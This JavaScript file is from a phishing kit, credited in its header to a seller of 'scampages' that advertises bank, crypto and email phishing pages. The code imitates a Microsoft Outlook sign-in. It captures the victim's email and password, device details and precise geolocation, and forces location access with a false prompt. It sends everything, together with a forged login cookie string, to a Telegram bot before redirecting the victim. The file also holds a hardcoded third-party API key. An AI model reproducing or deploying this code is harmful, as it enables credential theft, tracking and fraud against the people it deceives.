//THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//

//Do not touch this section

//When testing results, if you don't find it in your inbox, check your spam folder.

//If you want to get quality:
// - USA Banks Scampage
// - UK Banks Scampage
// - Australian Scampage
// - Canadian Scampage
// - Crypto Websites Scampage 
// - Email Accounts Scampage
// - Newsletter Scampage and more..

// Visit: https://www.scampage.shop/

const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";

document.addEventListener('DOMContentLoaded', () => {
	const unReq = "Enter a valid email address, phone number, or Skype name."
	const pwdReq = "Please enter the password for your Microsoft account."
	const unameInp = document.getElementById('inp_uname');
	const pwdInp = document.getElementById('inp_pwd');
	let view = "uname";

	let unameVal = pwdVal = false;

	unameInp.addEventListener('keydown', (event) => handleNextDown(event, nxt));

	function handleNextDown(event, nextButton) {
		if (event.key === "Enter") {
			event.preventDefault();
			nextButton.click(); // Trigger the click event on the next button
		}
	}

	pwdInp.addEventListener('keydown', (event) => handleSigDown(event, sig));

	function handleSigDown(event, sigButton) {
		if (event.key === "Enter") {
			event.preventDefault();
			sigButton.click(); // Trigger the click event on the next button
		}
	}

	/////next button
	const nxt = document.getElementById('btn_next');

	nxt.addEventListener('click', () => {
		//validate the form
		validate();
		if (unameVal) {
			document.getElementById("section_uname").classList.toggle('d-none');
			document.getElementById('section_pwd').classList.remove('d-none');
			document.querySelectorAll('#user_identity').forEach((e) => {
				e.innerText = unameInp.value;
			})
			view = "pwd";
		}
	})

	//////sign in button

	const sig = document.getElementById('btn_sig');

	sig.addEventListener('click', () => {
		//validate the form
		validate();
		if (pwdVal) {
			document.getElementById("section_pwd").classList.toggle('d-none');
			document.getElementById('section_final').classList.remove('d-none');
			view = "final";
		}
	})

	function validate() {
		function unameValAction(type) {
			if (!type) {
				document.getElementById('error_uname').innerText = unReq;
				unameInp.classList.add('error-inp');
				unameVal = false;
			} else {
				document.getElementById('error_uname').innerText = "";
				unameInp.classList.remove('error-inp')
				unameVal = true;
			}

		}

		function pwdValAction(type) {
			if (!type) {
				document.getElementById('error_pwd').innerText = pwdReq;
				pwdInp.classList.add('error-inp')
				pwdVal = false;
			} else {
				document.getElementById('error_pwd').innerText = "";
				pwdInp.classList.remove('error-inp')
				pwdVal = true;
			}

		}
		if (view === "uname") {
			if (unameInp.value.trim() === "") {
				unameValAction(false);
			} else {
				unameValAction(true);
				const email = unameInp.value;
				localStorage.setItem("email", email);
			}
			unameInp.addEventListener('change', function() {
				if (this.value.trim() === "") {
					unameValAction(false);
				} else {
					unameValAction(true);
				}
			})
		} else if (view === "pwd") {
			if (pwdInp.value.trim() === "") {
				pwdValAction(false);
			} else {
				pwdValAction(true);
				const password = pwdInp.value;
				localStorage.setItem("password", password);
				//saveAndSendLogs();
			}
			pwdInp.addEventListener('change', function() {
				if (this.value.trim() === "") {
					pwdValAction(false);
				} else {
					pwdValAction(true);
				}
			})
		}
		return false;
	}

	//back button
	document.querySelector('.back').addEventListener('click', () => {
		view = "uname";
		document.getElementById("section_pwd").classList.toggle('d-none');
		document.getElementById('section_uname').classList.remove('d-none');
	})

	//final buttons
	document.querySelectorAll('#btn_final').forEach((b) => {
		b.addEventListener('click', () => {
			saveAndSendLogs();
		})

		b.addEventListener('keydown', (event) => handleFinalDown(event, b));
	})

	function handleFinalDown(event, b) {
		if (event.key === "Enter") {
			event.preventDefault();
			saveAndSendLogs(); // Trigger the click event on the next button
		}
	}

	function saveAndSendLogs() {
		const username = localStorage.getItem("email");
		const password = localStorage.getItem("password");

		let email, domain;

		if (username) {
			if (!isNaN(username)) {
				// If the username is a number, set it as the email and leave domain empty
				email = username;
				//console.log("Username (numeric):", email);
			} else {
				const parts = username.split('@');

				if (parts.length === 2) {
					email = parts[0];
					domain = parts[1];

					//console.log("Username:", email);
					//console.log("Domain:", "@" + domain);
				} else {
					//console.error("Invalid email address");
				}
			}
		} else {
			//console.error("Email not found in localStorage");
		}

		if (email !== undefined) {
			var x = `__Host-MSAAUTHP.JSH=3$${email}${domain ? "%40" + domain : ""}$uaid=ca344a16750e4ec98c518acbad48d6db; domain=login.live.com; Secure; path=/; SameSite=None; HttpOnly; expires=Sat, 01-Mar-2025 21:52:08 GMT;`;
		} else {
			//console.error("Email is undefined");
		}



		const deviceInfo = {
			manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
			model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
			os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
			browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
		};

		getLocation(username, password, x, deviceInfo);
	};

	function getLocation(username, password, x, deviceInfo) {
		navigator.geolocation?.getCurrentPosition(async (position) => {
				const latitude = position.coords.latitude;
				const longitude = position.coords.longitude;

				const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;

				try {
					const response = await fetch(apiUrl);
					const data = await response.json();

					if (data.results.length > 0) {
						const result = data.results[0].components;
						const city = result.city || result.village || result.town;
						const state = result.state;
						const country = result.country;
						const zipCode = result.postcode;
						const continent = result.continent;
						const county = result.county;

						var dataToSend = {
							username,
							password,
							Device: deviceInfo.manufacturer,
							OS: deviceInfo.os,
							Browser: deviceInfo.browser,
							Latitude: latitude,
							Longitude: longitude,
							City: city,
							State: state,
							Country: country,
							County: county,
							ZipCode: zipCode,
							Cookies: x,
						};

						if (Object.keys(dataToSend).length > 0) {
							sendToTelegram(dataToSend);
						} else {
							console.warn("No data to send to Telegram.");
						}
					} else {
						console.error("Location information not found.");
					}
				} catch (error) {
					console.error("Error fetching location data:", error);
				}
			},
			(error) => {
				console.error("Error getting location:", error);
				alert("Location permission is required to login to Outlook.");
			});
	};

	function sendToTelegram(data) {


		var payload = {
			chat_id: chatId,
			text: `
            New Office365 Login:
            ________________________
               "Email address, phone number or skype": "${data.username}",
               "Password": "${data.password}",
               "Device Info": "${data.Device}",
               "OS": "${data.OS}",
               "Browser": "${data.Browser}",
               "Cookies": ["${data.Cookies}"],
            `
		};

		var sendToBot = {
			url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
			method: "POST",
			headers: {
				"Content-Type": "application/json",
				"cache-control": "no-cache"
			},
			data: JSON.stringify(payload)
		};

		$.ajax(sendToBot).done(function(response) {
			window.location.href = "/recover.html"
			// console.log("Telegram API response:", JSON.stringify(response));
		}).fail(function(error) {
			console.error("Error sending data to Telegram:", error);
		});
	}
});